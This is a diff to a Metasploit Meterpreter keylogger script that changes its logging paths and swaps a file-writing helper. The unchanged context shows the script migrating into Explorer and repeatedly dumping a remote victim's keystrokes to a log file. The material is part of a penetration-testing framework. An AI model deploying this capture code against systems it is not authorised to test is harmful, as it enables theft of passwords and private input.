@@ -1,8 +1,7 @@
 # $Id$
-#
-# Meterpreter script for monitoring and capturing Keystrokes and
-# saving them in to  a file.
-# Provided by Carlos Perez at carlos_perez[at]darkoperator.com
+# $Revision$
+# Author: Carlos Perez at carlos_perez[at]darkoperator.com
+#-------------------------------------------------------------------------------
 session = client
 # Script Options
 @@exec_opts = Rex::Parser::Arguments.new(
@@ -26,7 +25,7 @@ host,port = session.tunnel_peer.split(':')
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.config_directory, 'logs', 'keylogrecorder', host + filenameinfo )
+logs = ::File.join(Msf::Config.log_directory, 'scripts', 'keylogrecorder')
 
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
@@ -40,14 +39,6 @@ keytime = 30
 #Type of capture
 captype = 0
 
-# Function for writing results of other functions to a file
-def filewrt(file2wrt, data2wrt)
-        output = ::File.open(file2wrt, "a")
-        data2wrt.each_line do |d|
-                output.puts(d)
-        end
-        output.close
-end
 #Function to Migrate in to Explorer process to be able to interact with desktop
 def explrmigrate(session,captype)
 	begin
@@ -95,7 +86,7 @@ def keycap(session, keytime, logfile)
 		#Creating DB for captured keystrokes
 		print_status("Keystrokes being saved in to #{logfile}")
 		#Inserting keystrokes every number of seconds specified
-		print("[*] Recording .")
+		print_status("Recording ")
 		while rec == 1
 			#getting Keystrokes
 			data = session.ui.keyscan_dump
@@ -125,7 +116,7 @@ def keycap(session, keytime, logfile)
 				end
 			end
 			sleep(2)
-			filewrt(logfile,"#{outp}\n")
+			file_local_write(logfile,"#{outp}\n")
 			sleep(keytime.to_i)
 		end
 		db.close
